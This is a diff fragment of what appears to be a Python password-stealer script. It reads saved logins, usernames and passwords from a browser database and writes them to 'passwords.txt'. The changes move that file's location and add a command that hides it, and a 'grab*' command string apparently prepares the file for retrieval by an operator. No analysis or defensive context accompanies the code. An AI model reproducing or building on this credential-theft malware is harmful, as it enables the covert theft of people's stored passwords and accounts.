@@ -166,8 +166,8 @@ cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
 path3=getenv("LOCALAPPDATA")
 Null,userprof = (subprocess.check_output('set USERPROFILE', shell=True).split('='))
-#destination = 'passwords.txt'
-destination = getenv("LOCALAPPDATA") + "\\" + "passwords.txt"
+destination = 'passwords.txt'
+#destination = getenv("LOCALAPPDATA") + "\\" + "passwords.txt"
 
 for raw in cursor.fetchall():
 	try:
@@ -190,7 +190,7 @@ for raw in cursor.fetchall():
 		continue
 
 conn.close()
-
+subprocess.check_call(["attrib","+H",destination])
 command = "grab*" + destination
 
 
